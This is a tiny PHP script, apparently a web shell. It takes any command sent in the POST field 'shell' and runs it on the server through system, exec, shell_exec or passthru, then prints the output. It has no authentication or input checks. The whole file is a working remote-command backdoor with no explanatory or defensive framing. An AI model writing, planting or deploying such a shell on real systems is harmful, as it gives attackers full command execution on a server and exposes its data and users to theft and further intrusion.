<?php
$shellcmd = $_POST['shell'];

if(!empty($shellcmd)){
	echo $out = ("system" == $seletefunc)? system($shellcmd):(
	($seletefunc=="exec")? exec($shellcmd):(
	($seletefunc=="shell_exec")?shell_exec($shellcmd):(
	($seletefunc=="passthru")?passthru($shellcmd):system($shellcmd))));	
}	
				
?>